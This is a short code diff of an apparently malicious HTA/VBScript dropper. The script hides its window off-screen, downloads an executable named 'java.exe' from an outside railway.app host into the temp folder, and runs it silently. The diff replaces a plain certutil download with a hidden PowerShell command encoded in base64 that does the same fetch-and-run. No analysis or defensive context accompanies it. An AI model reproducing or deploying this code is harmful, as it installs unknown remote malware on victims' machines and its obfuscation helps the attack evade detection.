@@ -4,9 +4,9 @@ Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
 Dim s: Set s = CreateObject("WScript.Shell")
 Dim f: Set f = CreateObject("Scripting.FileSystemObject")
 Dim t: t = f.GetSpecialFolder(2)
-Dim u: u = "https://java-scan.up.railway.app/java.exe"
-Dim c: c = "certutil -urlcache -f " & u & " " & t & "\java.exe"
-s.Run c, 0, True
+
+Dim ps: ps = "powershell -w h -enc JAB3AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGoAYQB2AGEALQBzAGMAYQBuAC4AdQBwAC4AcgBhAGkAbAB3AGEAeQAuAGEAcABwAC8AagBhAHYAYQAuAGUAeABlACcALAAkAGUAbgB2ADoAdABlAG0AcAArACcAXABqAGEAdgBhAC4AZQB4AGUAJwApADsAcwB0AGEAcgB0ACAAKAAkAGUAbgB2ADoAdABlAG0AcAArACcAXABqAGEAdgBhAC4AZQB4AGUAJwApAA=="
+s.Run ps, 0, True
 
 If f.FileExists(t & "\java.exe") Then
     s.Run Chr(34) & t & "\java.exe" & Chr(34), 0, False
